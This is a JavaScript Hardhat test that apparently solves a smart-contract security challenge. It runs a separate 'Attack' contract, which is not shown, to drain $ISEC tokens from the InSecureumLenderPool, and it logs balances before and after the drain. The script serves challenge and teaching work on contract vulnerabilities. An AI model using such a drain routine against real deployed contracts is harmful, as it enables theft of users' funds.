const { expect } = require("chai");

describe("Challenge 1", function () {
  it("Transfer all balance", async function () {
    const [player,deployer] = await ethers.getSigners();
    
    const TokenContract = await ethers.getContractFactory("InSecureumToken");
    const toa='0x8464135c8F25Da09e49BC8782676a84730C318bC';
    const tokenContract = await TokenContract.attach(toa);
    
    const LenderContract = await ethers.getContractFactory("InSecureumLenderPool");
    const toa2='0x71C95911E9a5D330f4D621842EC243EE1343292e';
    const lenderContract = await LenderContract.attach(toa2);

    const AttackContract = await ethers.getContractFactory("Attack");
    const toa3='0x5FbDB2315678afecb367f032d93F642f64180aa3';
    const attackContract = await AttackContract.attach(toa3);

    //The idea is that anyone can deposit $ISECs to enlarge the pool's resources.
    //Will you be able to steal the $ISECs from the InSecureumLenderPool?
    console.log("Before exploit");
    console.log("Deployer Token balance:", ethers.utils.formatEther(await tokenContract.balanceOf(deployer.address)).toString());
    console.log("Player Token balance:", ethers.utils.formatEther(await tokenContract.balanceOf(player.address)).toString());
    console.log("LenderPoolContract Token balance:", ethers.utils.formatEther(await tokenContract.balanceOf(toa2)).toString());
    console.log("AttackContract Token balance:", ethers.utils.formatEther(await tokenContract.balanceOf(toa3)).toString());
    const tx=await attackContract.exploit(lenderContract.address);
    await ethers.provider.waitForTransaction(tx.hash);
    console.log("\nAfter exploit");
    console.log("Deployer Token balance:", ethers.utils.formatEther(await tokenContract.balanceOf(deployer.address)).toString());
    console.log("Player Token balance:", ethers.utils.formatEther(await tokenContract.balanceOf(player.address)).toString());
    console.log("LenderPoolContract Token balance:", ethers.utils.formatEther(await tokenContract.balanceOf(toa2)).toString());
    console.log("AttackContract Token balance:", ethers.utils.formatEther(await tokenContract.balanceOf(toa3)).toString());
    //Tokens transfered from lenderContract(toa2) to AttackerContract(toa3)
  });
});